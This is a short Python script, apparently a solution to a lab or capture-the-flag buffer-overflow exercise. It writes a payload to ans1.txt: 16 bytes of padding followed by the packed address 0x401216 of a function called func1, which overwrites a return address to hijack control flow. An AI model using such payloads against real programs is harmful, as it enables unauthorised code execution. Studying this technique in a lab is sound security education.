import struct
padding_len = 16 # buffer+ebp

# func1 函数的起始地址
target_addr = 0x401216

padding = b'A' * padding_len
address_bytes = struct.pack("<Q", target_addr)
payload = padding + address_bytes

with open("ans1.txt", "wb") as f:
    f.write(payload)

print(f"[*] Payload 生成完毕，跳转目标: {hex(target_addr)}")
